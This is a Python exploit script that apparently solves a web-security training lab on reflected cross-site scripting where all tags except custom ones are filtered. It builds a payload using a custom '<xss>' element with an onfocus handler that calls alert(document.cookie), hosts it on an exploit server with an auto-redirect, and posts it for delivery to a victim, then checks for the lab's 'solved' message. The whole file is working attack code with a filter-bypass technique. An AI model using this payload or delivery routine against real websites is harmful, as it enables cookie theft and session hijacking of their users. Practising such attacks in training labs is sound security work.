# Reflected XSS into HTML context with all tags blocked except custom ones

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def send_payload(url, payload, attacker):
	injection_uri = url + payload
	post_exploit_path = attacker + '/'
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = requests.post(post_exploit_path, data=post_exploit_data, verify=False, proxies=proxies)
	time.sleep(1)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = requests.post(post_exploit_path, data=post_exploit_data, verify=False, proxies=proxies)
	time.sleep(2)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\t%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path)
	return r

def send_xss(url, attacker):
	search_path = url + '/'
	xss_payload = """<script>
location = '""" + url + """/?search=<xss id=x onfocus="alert(document.cookie)" tabindex=1>#x';
</script>"""
	r = send_payload(search_path,  xss_payload, attacker)
	return r

def main():
	print('[+] Lab: Reflected XSS into HTML context with all tags blocked except custom ones')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <ATTACKER>' % sys.argv[0])
		print('[+] Example: %s https://www.target.com https://xxxxxxxxxxxxxxxxxxxx..exploit-server.net' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigued) <!>')
		sys.exit(-1)
	else:
		print('[+] Trying send a cross-site scripting attack to the victim...')
		r = send_xss(url, attacker)
		if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
			print('[+] The lab is solved')
		elif r.status_code == 200:
			print('[+] The Exploit sent the given payload !')


if __name__ == "__main__":
	main()
